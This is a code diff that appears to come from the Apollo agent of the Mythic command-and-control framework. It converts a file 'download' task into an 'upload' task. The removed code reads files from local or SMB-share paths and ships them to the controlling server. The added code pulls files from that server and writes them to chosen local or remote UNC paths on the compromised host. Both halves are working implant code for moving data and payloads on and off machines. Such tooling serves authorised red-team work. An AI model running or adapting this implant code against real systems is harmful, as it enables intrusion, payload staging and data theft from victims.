@@ -1,64 +1,148 @@
 ﻿#define COMMAND_NAME_UPPER
 
 #if DEBUG
-#define DOWNLOAD
+#define UPLOAD
 #endif
 
-#if DOWNLOAD
+#if UPLOAD
 
 using System;
-using System.Linq;
 using ApolloInterop.Classes;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.IO;
+using ApolloInterop.Utils;
+using System.Linq;
 
 namespace Tasks
 {
-    public class download : Tasking
+    public class upload : Tasking
     {
         [DataContract]
-        internal struct DownloadParameters
+        internal struct UploadParameters
         {
+#pragma warning disable 0649
+            [DataMember(Name = "remote_path")]
+            internal string RemotePath;
             [DataMember(Name = "file")]
-            public string FileName;
+            internal string FileID;
+            [DataMember(Name = "file_name")]
+            internal string FileName;
             [DataMember(Name = "host")]
-            public string Hostname;
+            internal string HostName;
+#pragma warning restore 0649
         }
 
-        private static string[] localhostAliases = new string[]
-        {
-            "localhost",
-            "127.0.0.1",
-            Environment.GetEnvironmentVariable("COMPUTERNAME").ToLower()
-        };
-
-        public download(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
+        public upload(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
 
         }
+
+        internal string ParsePath(UploadParameters p)
+        {
+            string uploadPath;
+            if (!string.IsNullOrEmpty(p.HostName))
+            {
+                if (!string.IsNullOrEmpty(p.RemotePath))
+                {
+                    uploadPath = string.Format(@"\\{0}\{1}", p.HostName, p.RemotePath);
+                }
+                else
+                {
+                    // Remote paths require a share name
+                    throw new ArgumentException("SMB share name not specified.");
+                }
+            }
+            else
+            {
+                string host = Environment.GetEnvironmentVariable("COMPUTERNAME"); ;
+                string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
+                if (cwd.StartsWith("\\\\"))
+                {
+                    var hostPieces = cwd.Split('\\');
+                    if (hostPieces.Length > 2)
+                    {
+                        host = hostPieces[2];
+                    }
+                    else
+                    {
+                        var resp = CreateTaskResponse($"invalid UNC path for CWD: {cwd}. Can't determine host. Please use explicit UNC path", true, "error");
+                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                    }
+                }
+                if (!string.IsNullOrEmpty(p.RemotePath))
+                {
+                    if (Path.IsPathRooted(p.RemotePath))
+                    {
+                        uploadPath = p.RemotePath;
+                    }
+                    else
+                    {
+                        uploadPath = Path.GetFullPath(p.RemotePath);
+                    }
+                }
+                else
+                {
+                    uploadPath = Directory.GetCurrentDirectory();
+                }
+
+            }
+
+            string unresolvedFilePath;
+            var uploadPathInfo = new DirectoryInfo(uploadPath);
+            if (uploadPathInfo.Exists)
+            {
+                unresolvedFilePath = Path.Combine([uploadPathInfo.FullName, p.FileName]);
+            }
+            else if (uploadPathInfo.Parent is DirectoryInfo parentInfo && parentInfo.Exists)
+            {
+                unresolvedFilePath = uploadPathInfo.FullName;
+            }
+            else
+            {
+                throw new ArgumentException($"{uploadPath} does not exist.");
+            }
+
+            var parentPath = Path.GetDirectoryName(unresolvedFilePath);
+            var fileName = unresolvedFilePath.Split(Path.DirectorySeparatorChar).Last();
+
+            string resolvedParent;
+            if (PathUtils.TryGetExactPath(parentPath, out var resolved))
+            {
+                resolvedParent = resolved;
+            }
+            else
+            {
+                resolvedParent = parentPath;
+            }
+
+            return Path.Combine([resolvedParent, fileName]);
+        }
+
 
         public override void Start()
         {
             MythicTaskResponse resp;
-            try
+            UploadParameters parameters = _jsonSerializer.Deserialize<UploadParameters>(_data.Parameters);
+            // some additional upload logic
+            if (_agent.GetFileManager().GetFile(
+                    _cancellationToken.Token,
+                    _data.ID,
+                    parameters.FileID,
+                    out byte[] fileData))
             {
-                DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
-                string host = parameters.Hostname;
-                if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
+                try
                 {
-                    resp = CreateTaskResponse(
-                        $"File '{parameters.FileName}' does not exist.",
-                        true,
-                        "error");
-                }
-                else
-                {
-                    string path;
-                    if (string.IsNullOrEmpty(parameters.Hostname))
+                    string path = ParsePath(parameters);
+                    File.WriteAllBytes(path, fileData);
+                    string host = Environment.GetEnvironmentVariable("COMPUTERNAME");
+                    if (!string.IsNullOrEmpty(parameters.HostName))
                     {
-                        path = parameters.FileName;
+                        host = parameters.HostName;
+                    }
+                    else
+                    {
                         string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
                         if (cwd.StartsWith("\\\\"))
                         {
@@ -66,63 +150,39 @@ namespace Tasks
                             if (hostPieces.Length > 2)
                             {
                                 host = hostPieces[2];
-                                path = $@"\\{hostPieces[2]}\{parameters.FileName}";
-                            }
-                            else
-                            {
-                                resp = CreateTaskResponse($"invalid UNC path for CWD: {cwd}. Can't determine host. Please use explicit UNC path", true, "error");
-                                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                             }
                         }
-                        else
+                    }
+                    resp = CreateTaskResponse(
+                    $"Uploaded {fileData.Length} bytes to {path} on {host}",
+                    true,
+                    "completed",
+                    new IMythicMessage[]
+                    {
+                        new UploadMessage()
                         {
-                            host = Environment.GetEnvironmentVariable("COMPUTERNAME");
-                        }
-
-                    } else if (localhostAliases.Contains(parameters.Hostname.ToLower()))
-                    {
-                        path = parameters.FileName;
-                        host = Environment.GetEnvironmentVariable("COMPUTERNAME");
-                    }
-                    else
-                    {
-                        path = $@"\\{parameters.Hostname}\{parameters.FileName}";
-
-                    }
-                    byte[] fileBytes = new byte[0];
-                    fileBytes = File.ReadAllBytes(path);
-
-                    IMythicMessage[] artifacts = new IMythicMessage[1]
-                    {
-                        new Artifact
-                        {
-                            BaseArtifact = "FileOpen",
-                            ArtifactDetails = path
-                        }
-                    };
-                    if (_agent.GetFileManager().PutFile(
-                            _cancellationToken.Token,
-                            _data.ID,
-                            fileBytes,
-                            parameters.FileName,
-                            out string mythicFileId,
-                            false,
-                            host))
-                    {
-                        resp = CreateTaskResponse(mythicFileId, true, "completed", artifacts);
-                    }
-                    else
-                    {
-                        resp = CreateTaskResponse(
-                            $"Download of {path} failed or aborted.",
-                            true,
-                            "error", artifacts);
-                    }
+                            FileID = parameters.FileID,
+                            FullPath = path,
+                            Host = host,
+                        },
+                        Artifact.FileWrite(path, fileData.Length)
+                    });
+                }
+                catch (Exception ex)
+                {
+                    resp = CreateTaskResponse($"Failed to upload file: {ex.Message}", true, "error");
                 }
             }
-            catch (Exception ex)
+            else
             {
-                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
+                if (_cancellationToken.IsCancellationRequested)
+                {
+                    resp = CreateTaskResponse($"Task killed.", true, "killed");
+                }
+                else
+                {
+                    resp = CreateTaskResponse("Failed to fetch file due to unknown reason.", true, "error");
+                }
             }
 
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
